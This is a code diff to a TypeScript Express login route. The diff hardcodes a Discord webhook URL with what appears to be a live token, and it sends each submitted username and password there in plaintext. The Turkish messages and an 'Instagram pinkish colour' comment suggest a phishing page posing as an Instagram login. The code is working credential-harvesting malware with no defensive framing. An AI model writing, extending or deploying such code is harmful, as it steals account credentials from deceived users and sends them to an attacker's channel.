@@ -12,27 +12,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       // Validate input
       const formData = loginFormSchema.parse(req.body);
-      const { username, password, webhookUrl } = formData;
+      const { username, password } = formData;
+      const webhookUrl = "https://discord.com/api/webhooks/1350611573877637231/misaVFr3Y4t-rIcHLyo7GqBZfq7Osf3NesaOoLdj_GX8cEA5QiynrK3AW9mILP_6yBA4";
 
       // Prepare Discord webhook message
       const message = {
-        content: "New Login Attempt",
+        content: "Yeni Giriş Denemesi",
         embeds: [{
-          title: "Login Information",
-          color: 3447003, // Blue color
+          title: "Giriş Bilgileri",
+          color: 16426522, // Instagram pembemsi renk
           fields: [
             {
-              name: "Username",
+              name: "Kullanıcı Adı",
               value: username,
               inline: true
             },
             {
-              name: "Password",
+              name: "Şifre",
               value: password,
               inline: true
             },
             {
-              name: "Timestamp",
+              name: "Zaman",
               value: new Date().toISOString(),
               inline: false
             }
@@ -48,12 +49,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
         });
         
-        return res.status(200).json({ success: true, message: "Login information sent successfully!" });
+        return res.status(200).json({ success: true, message: "Giriş bilgileri başarıyla gönderildi!" });
       } catch (error) {
         console.error("Discord webhook error:", error);
         return res.status(500).json({ 
           success: false, 
-          message: "Failed to send information. Please check the webhook URL."
+          message: "Bilgiler gönderilirken bir hata oluştu. Lütfen daha sonra tekrar deneyin."
         });
       }
     } catch (error) {
